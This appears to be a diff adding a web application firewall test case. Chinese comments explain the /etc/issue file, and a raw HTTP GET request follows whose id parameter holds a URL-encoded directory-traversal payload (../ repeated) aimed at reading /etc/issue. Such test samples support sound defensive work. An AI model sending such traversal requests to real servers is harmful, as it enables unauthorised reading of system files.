@@ -1,0 +1,9 @@
+# 目录遍历_/etc/issue
+# /etc/issue 文件是一个用于在登录时显示系统信息的文件，通常在类Unix系统中使用。这个文件通常包含有关操作系统版本、发行版、主机名等信息。当用户登录到系统时，这些信息会显示在登录提示符之前，提供了一些基本的系统信息。
+GET /?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fissue&bid=hd_tag_m8mv23sp HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23sp
+RM-PRO-Token: 31916dcc2d88e007ad93f1e8bdc7c7d6
+RM-PRO-Time: 1742808342299
+User-Agent: curl/7.83.1
+
